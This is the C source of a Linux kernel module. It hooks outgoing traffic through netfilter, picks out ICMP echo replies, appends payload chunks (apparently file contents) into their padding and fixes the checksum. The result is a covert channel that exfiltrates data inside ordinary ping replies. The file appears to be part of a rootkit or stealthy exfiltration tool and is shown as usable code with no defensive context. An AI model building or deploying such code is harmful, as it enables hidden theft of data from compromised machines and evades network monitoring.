#include "netfilter.h"
#include "net/checksum.h"
#include "fs/payload_generator.h"

#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>

#include <linux/atomic.h>

#define ICMPHDR_TIMESTAMP_FIELD_SIZE (8)

static struct nf_hook_ops netfilter_hook;

static void register_hook(void);
static void unregister_hook(void);

get_payload_func_t get_payload_func = NULL;

static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, unsigned int len)
{
	void *tmp = skb_put(skb, len);
	memcpy(tmp, data, len);
	return tmp;
}

unsigned int nf_sendfile_hook(void *priv,
                              struct sk_buff *skb,
                              const struct nf_hook_state *state)
{
    if (NULL == get_payload_func) {
        // as long as we don't have a way to get our payloads, we don't 
        // have much to do.
        printk(KERN_DEBUG "supposed to skip this one.\n");
        return NF_ACCEPT;
    }

    struct iphdr *ip_layer = ip_hdr(skb);
    if (IPPROTO_ICMP != ip_layer->protocol) {
        // ignore any non-ICMP packets.
        return NF_ACCEPT;
    }
    
    struct icmphdr *icmp_layer = icmp_hdr(skb);
    if (ICMP_ECHOREPLY != icmp_layer->code) {
        // ignore ICMP echo-request packets.
        return NF_ACCEPT;
    }

    unsigned int icmp_data_offset = sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMPHDR_TIMESTAMP_FIELD_SIZE;

    __u8* icmp_data = skb->data + icmp_data_offset;
    ssize_t icmp_data_length = skb->len - icmp_data_offset;
    
    // TODO: 1. who frees it?
    // TODO: 2. must be in padding, otherwise the ICMP reply will fail
    // TODO: 3. check if there is enough space!
    size_t default_payload_size = get_default_payload_chunk_size();
    size_t actual_payload_size = 0;
    char* payload_data = (char*)kmalloc(default_payload_size, GFP_KERNEL);
    if (NULL == payload_data) {
        return NF_ACCEPT;
    }

    // get the payload we wish to send. payload_data acts as an output 
    // parameter to which get_payload_func copies the payload.
    if (get_payload_func(payload_data, &actual_payload_size)) {
        return NF_ACCEPT;
    }

    // since we want our payload to be in the packet's padding, we want to 
    // calculate the size of the ICMP packet BEFORE writing the payload to 
    // the skbuff. otherwise, skb_put_data will update skb->len to include 
    // our payload.
    ssize_t icmp_and_up_size = skb->len - sizeof(struct iphdr);

    // min(default_payload_size, actual_payload_size) as there might be a 
    // case that the payload is smaller than the default chunk size.
    skb_put_data_impl(skb, payload_data, min(default_payload_size, actual_payload_size));

    icmp_layer->checksum = 0;
    icmp_layer->checksum = icmp_csum((const void *)icmp_layer, icmp_and_up_size);

    return NF_ACCEPT;
}

void register_nf_hook(void)
{
    netfilter_hook.hook = nf_sendfile_hook;
    netfilter_hook.priority = INT_MIN;
    netfilter_hook.hooknum = NF_INET_POST_ROUTING;
    netfilter_hook.pf = PF_INET;

    nf_register_net_hook(&init_net, &netfilter_hook);
}

void unregister_nf_hook(void)
{
    nf_unregister_net_hook(&init_net, &netfilter_hook);
}